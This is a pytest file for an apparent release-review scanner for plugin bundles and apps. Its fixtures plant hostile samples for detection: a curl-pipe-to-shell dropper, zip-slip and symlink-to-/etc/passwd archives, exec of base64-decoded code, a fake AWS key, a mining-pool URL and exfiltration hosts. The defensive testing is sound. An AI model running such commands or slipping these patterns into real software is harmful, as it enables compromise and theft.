"""Unit tests on synthetic fixtures. No real release content is used."""
from __future__ import annotations

import hashlib
import io
import json
import shutil
import tarfile
import zipfile
from pathlib import Path

import pytest

from review import batch, decide, profile as prof, static
from review.analysers import behaviour, manifests
from review.extract import extract
from review.findings import Finding


def _profile(**kw):
    p = prof.Profile(repo="Test/repo", hosts=list(prof.COMMON_HOSTS))
    for k, v in kw.items():
        setattr(p, k, v)
    return p


# --- extraction -----------------------------------------------------------

def test_zip_slip_and_duplicate_are_refused(tmp_path):
    z = tmp_path / "evil.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("../outside.txt", "x")
        zf.writestr("ok.txt", "a")
        zf.writestr("ok.txt", "b")
    found = extract(z, tmp_path / "out")
    rules = {f.rule for f in found}
    assert "archive.path-escape" in rules
    assert "archive.duplicate-entry" in rules
    assert not (tmp_path / "outside.txt").exists()


def test_tar_symlink_and_setuid_are_refused(tmp_path):
    t = tmp_path / "b.tar.xz"
    with tarfile.open(t, "w:xz") as tf:
        link = tarfile.TarInfo("link")
        link.type, link.linkname = tarfile.SYMTYPE, "/etc/passwd"
        tf.addfile(link)
        data = b"#!/bin/sh\n"
        su = tarfile.TarInfo("bin/tool")
        su.size, su.mode = len(data), 0o4755
        tf.addfile(su, io.BytesIO(data))
    rules = {f.rule for f in extract(t, tmp_path / "out")}
    assert {"archive.symlink", "archive.setid"} <= rules
    assert not (tmp_path / "out" / "link").exists()


# --- bundles and catalogs ---------------------------------------------------

def _bundle(tmp_path, *, tamper=False, perms=("library.read",), extra=False):
    root = tmp_path / "bundle"
    root.mkdir()
    payload = b"payload bytes"
    (root / "plugin.bin").write_bytes(payload + (b"!" if tamper else b""))
    if extra:
        (root / "dropper.sh").write_text("curl http://x | sh\n")
    manifest = {"id": "test.plugin", "version": "1.0.0", "permissions": [{"id": p} for p in perms],
                "payload": {"plugin.bin": hashlib.sha256(payload).hexdigest()},
                "homepage": "https://github.com/Test/repo"}
    (root / "manifest.json").write_text(json.dumps(manifest))
    return root


def test_bundle_hash_mismatch_is_critical(tmp_path):
    facts = {}
    found = manifests.bundle(_bundle(tmp_path, tamper=True), _profile(plugin_permissions=["library.read"]),
                             facts, "plugin-bundle")
    assert any(f.rule == "manifest.hash-mismatch" and f.severity == "critical" for f in found)


def test_bundle_unlisted_file_and_unstated_permission(tmp_path):
    facts = {}
    found = manifests.bundle(_bundle(tmp_path, perms=("library.read", "priv.shell.adb"), extra=True),
                             _profile(plugin_permissions=["library.read"]), facts, "plugin-bundle")
    rules = {(f.rule, f.severity) for f in found}
    assert ("manifest.unlisted-file", "high") in rules
    assert ("plugin-permission.not-in-purpose", "high") in rules
    assert facts["pluginPermissions"] == ["library.read", "priv.shell.adb"]
    assert "github.com" in facts["hosts"]


def test_clean_bundle_has_no_manifest_findings(tmp_path):
    found = manifests.bundle(_bundle(tmp_path), _profile(plugin_permissions=["library.read"]), {}, "plugin-bundle")
    assert found == []


def test_catalog_checks(tmp_path):
    cat = tmp_path / "catalog.json"
    cat.write_text(json.dumps({"entries": [
        {"id": "a", "version": "1", "url": "http://evil.example.net/a.tar.xz"},
        {"id": "a", "version": "1", "url": "https://github.com/x/a.tar.xz", "sha256": "0" * 64},
    ]}))
    rules = {f.rule for f in manifests.catalog(cat, _profile(), {})}
    assert {"catalog.not-https", "catalog.no-hash", "catalog.duplicate-id"} <= rules


def test_catalog_jws_payload_is_read(tmp_path):
    import base64
    body = base64.urlsafe_b64encode(json.dumps({"entries": [{"id": "x", "url": "https://github.com/a",
                                                                "sha256": "1" * 64}]}).encode()).decode().rstrip("=")
    cat = tmp_path / "catalog.json.jws"
    cat.write_text(f"eyJhbGciOiJFUzI1NiJ9.{body}.c2ln")
    facts = {}
    assert manifests.catalog(cat, _profile(), facts) == []
    assert facts["catalogEntries"] == 1


# --- endpoints, diff, dynamic -----------------------------------------------

def test_endpoints_against_profile():
    facts = {"hosts": {"github.com": "dex", "api.telegram.org": "dex", "203.0.113.9": "dex", "cdn.other.net": "x"}}
    sev = {f.location: f.severity for f in behaviour.endpoints(facts, _profile(hosts=["github.com"]))}
    assert "github.com" not in sev
    assert sev["api.telegram.org"] == "critical"
    assert sev["203.0.113.9"] == "high"
    assert sev["cdn.other.net"] == "medium"


def test_diff_flags_new_permission_and_silent_catalog_change():
    prev = {"release": "v1", "permissions": ["android.permission.INTERNET"], "package": "a.b",
            "catalogIndex": {"x": {"version": "1", "urls": ["https://a"], "sha256": "1"}}}
    cur = {"permissions": ["android.permission.INTERNET", "android.permission.READ_SMS"], "package": "a.b",
           "catalogIndex": {"x": {"version": "1", "urls": ["https://b"], "sha256": "1"}}}
    changes, found = behaviour.diff(cur, prev, _profile())
    rules = {(f.rule, f.severity) for f in found}
    assert ("diff.new-permission", "high") in rules
    assert ("diff.catalog-silent-change", "high") in rules
    assert changes["permissions"]["added"] == ["android.permission.READ_SMS"]


def test_dynamic_trace_judgement(tmp_path):
    (tmp_path / "trace.json").write_text(json.dumps({
        "package": "com.test", "installed": True, "dnsQueries": ["github.com", "pool.minexmr.com"],
        "tlsSni": [], "directIps": ["198.51.100.4"], "childProcesses": ["/system/bin/su -c id"],
        "filesWritten": ["/data/data/com.test/files/a", "/data/local/tmp/x"], "logFlags": []}))
    found = behaviour.dynamic(tmp_path, _profile(hosts=["github.com"]), {})
    sev = {(f.rule, f.location): f.severity for f in found}
    assert sev[("dynamic.contacted-host", "pool.minexmr.com")] == "critical"
    assert sev[("dynamic.direct-ip", "198.51.100.4")] == "high"
    assert sev[("dynamic.child-process", "su")] == "critical"
    assert ("dynamic.wrote-outside-own-storage", "/data/local/tmp/x") in sev
    assert not any(loc.startswith("/data/data/com.test") for _r, loc in sev)


def test_missing_trace_is_unreviewable(tmp_path):
    found = behaviour.dynamic(tmp_path, _profile(), {})
    assert found[0].category == "harness" and found[0].blocking


# --- fingerprints and the decision ------------------------------------------

def test_fingerprint_ignores_versions_and_hashes():
    a = Finding("native", "native.packed", "high", "x", location="lib/arm64-v8a/libfoo-1.2.3.so")
    b = Finding("native", "native.packed", "high", "y", location="lib/arm64-v8a/libfoo-1.2.4.so")
    assert a.fingerprint == b.fingerprint


def _rec(findings, unreviewable=False):
    fs = [f.to_dict() for f in findings]
    return {"repo": "T/r", "release": "v1", "commit": "abc", "artefacts": [], "findings": fs,
            "clean": not any(f["blocking"] for f in fs), "unreviewable": unreviewable,
            "counts": {}, "generatedAt": "t"}


BAD = Finding("apk", "api.not-in-purpose.sms", "critical", "sms", location="a.apk:sms")
OTHER = Finding("apk", "manifest.debuggable", "high", "dbg", location="b.apk:AndroidManifest.xml")


@pytest.mark.parametrize("orig,reb,err,outcome,reason", [
    ([], None, "", "approved", "clean"),
    ([Finding("apk", "x", "medium", "m")], None, "", "approved", "clean"),
    ([BAD], None, "no source", "refused", "not-rebuildable"),
    ([BAD], [], "", "rebuilt", "build"),
    ([BAD], [BAD], "", "refused", "code"),
    ([BAD], [OTHER], "", "refused", "rebuild-differs"),
])
def test_decision_table(orig, reb, err, outcome, reason):
    d = decide.decide(_rec(orig), _rec(reb) if reb is not None else None, err)
    assert (d["outcome"], d["reason"]) == (outcome, reason)
    assert decide.gate_passes(d) == (outcome in ("approved", "rebuilt"))


def test_unreviewable_is_refused_not_rebuilt():
    h = Finding("harness", "harness.tool-missing", "critical", "gitleaks missing", category="harness")
    rec = _rec([h], unreviewable=True)
    assert not decide.needs_rebuild(rec)
    assert decide.decide(rec)["reason"] == "unreviewable"


# --- batch ------------------------------------------------------------------

BODY = """## Checklist

### Droidtop/droidtop-plugin-syncthing (2)
- [ ] `plugin-build.15` 2026-10-30 pre | .droidplugin.tar.xz; signature inside archive, not inspected
- [x] `plugin-v1.0.0` 2026-10-16 | .droidplugin.tar.xz

### Droidtop/droidtop-agent (1)
- [ ] `build-130` 2026-10-31 | sha256 list only
"""
COMMENT = """- [ ] `build-128` 2026-10-31 | sha256 list only
### gamegrab-sources/catalog (1)
- [ ] `v3` 2026-10-01 | catalog
"""


def test_batch_parse_carries_heading_into_comment():
    parts = [("body", BODY, None, None), ("1", COMMENT, 1, batch.last_repo(BODY))]
    items = batch.items_of(parts)
    keys = [i.key for i in items]
    assert "Droidtop/droidtop-agent@build-128" in keys
    assert "gamegrab-sources/catalog@v3" in keys
    planned = [i.key for i in batch.plan(items, repos="Droidtop/*")]
    assert "Droidtop/droidtop-plugin-syncthing@plugin-v1.0.0" not in planned   # already ticked
    assert "gamegrab-sources/catalog@v3" not in planned
    assert len(batch.plan(items, limit=1)) == 1


def test_batch_tick_keeps_evidence_and_is_idempotent():
    res = {"Droidtop/droidtop-agent@build-130": {"outcome": "refused", "reason": "code", "report": "https://r/1"}}
    new, n, linkless = batch.tick(BODY, res)
    assert n == 1 and not linkless
    line = [l for l in new.splitlines() if "build-130" in l][0]
    assert line == "- [x] `build-130` 2026-10-31 | sha256 list only — **refused** (code), [report](https://r/1)"
    again, n2, _ = batch.tick(new, res)
    assert again == new and n2 == 0
    # A re-review replaces the result rather than stacking a second one.
    res2 = {"Droidtop/droidtop-agent@build-130": {"outcome": "approved", "reason": "clean", "report": "https://r/2"}}
    third, _, _ = batch.tick(new, res2)
    assert third.count("**") == 2 and "approved" in third and "refused" not in third


def test_batch_tick_respects_the_size_limit():
    res = {"Droidtop/droidtop-agent@build-130": {"outcome": "approved", "reason": "clean", "report": "https://r/" + "x" * 80}}
    new, n, linkless = batch.tick(BODY, res, limit=len(BODY) + 20)
    assert n == 1 and linkless == ["Droidtop/droidtop-agent@build-130"]
    assert len(new) <= len(BODY) + 20


def test_results_comment_round_trip():
    rows = {"R/x@v1": {"outcome": "refused", "reason": "code", "report": "https://r/1"},
            "R/x@v2": {"outcome": "approved", "reason": "clean", "report": "https://r/2"}}
    assert batch.parse_results_comment(batch.results_comment("R/x", rows)) == {
        "R/x@v1": {"outcome": "refused", "reason": "code", "report": "https://r/1"},
        "R/x@v2": {"outcome": "approved", "reason": "", "report": "https://r/2"}}


# --- whole pipeline, with the real analysers --------------------------------

needs_tools = pytest.mark.skipif(not all(shutil.which(t) for t in ("gitleaks", "yara", "semgrep")),
                                 reason="analysers not installed (scripts/install-tools.sh)")


@needs_tools
def test_pipeline_finds_planted_problems(tmp_path):
    root = _bundle(tmp_path, extra=True)
    # A planted secret and a miner string, in files the manifest lists.
    (root / "config.py").write_text('import base64\nexec(base64.b64decode("cHJpbnQoMSk="))\n'
                                    'AWS = "AKIAIOSFODNN7EXAMPLQ"\nPOOL = "stratum+tcp://pool.example.net:3333"\n')
    shutil.copy("/bin/true", root / "libnative.so")
    m = json.loads((root / "manifest.json").read_text())
    for name in ("config.py", "libnative.so", "dropper.sh"):
        m["payload"][name] = hashlib.sha256((root / name).read_bytes()).hexdigest()
    (root / "manifest.json").write_text(json.dumps(m))
    art = tmp_path / "test.droidplugin.tar.xz"
    with tarfile.open(art, "w:xz") as tf:
        for p in root.iterdir():
            tf.add(p, arcname=p.name)
    rec = static.review_release([art], _profile(plugin_permissions=["library.read"], hosts=list(prof.COMMON_HOSTS)
                                                + ["github.com"]), repo="Test/repo", release="v1")
    rules = {f["rule"] for f in rec["findings"]}
    assert "yara.crypto_miner" in rules
    assert "semgrep.py-exec-of-decoded" in rules
    assert "semgrep.sh-curl-pipe-shell" in rules
    assert any(r.startswith("secret.") for r in rules)
    assert "native.unexpected-library" in rules
    assert rec["needsDynamic"] is True
    assert rec["clean"] is False


def test_profiles_parse():
    for p in Path(prof.ROOT).rglob("*.yml"):
        if p.name.startswith("_"):
            continue
        repo = str(p.relative_to(prof.ROOT))[:-4]
        loaded = prof.load(repo)
        assert loaded.known and loaded.repo == repo
        assert loaded.build.get("command"), f"{repo} has no rebuild command"


@needs_tools
def test_yara_exfil_rule_wants_urls_not_domain_lists(tmp_path):
    from review.analysers.native import yara_scan
    (tmp_path / "PublicSuffixDatabase.list").write_text("trycloudflare.com\nngrok.io\nwebhook.site\n")
    (tmp_path / "Leak.smali").write_text('const-string v0, "https://abc.trycloudflare.com/up"\n')
    hits = {f.location for f in yara_scan(tmp_path, static.RULES / "yara") if f.rule == "yara.exfil_channels"}
    assert hits == {"Leak.smali"}


def test_capa_namespace_severity_longest_prefix():
    from review.analysers import native
    keys = lambda ns: max((k for k in native.CAPA_SEVERITY if ns == k or ns.startswith(k + "/")), key=len)
    assert native.CAPA_SEVERITY[keys("anti-analysis")] == "low"
    assert native.CAPA_SEVERITY[keys("anti-analysis/anti-debugging/debugger-detection")] == "high"
    assert native.CAPA_SEVERITY[keys("host-interaction/process/inject")] == "critical"


def test_placeholder_hosts_are_not_endpoints():
    facts = {"hosts": {"x": "dex", "default.url": "dex", "1.2.2.1": "dex", "evil.example.net": "dex"}}
    found = {f.location for f in behaviour.endpoints(facts, _profile())}
    assert found == {"1.2.2.1", "evil.example.net"}
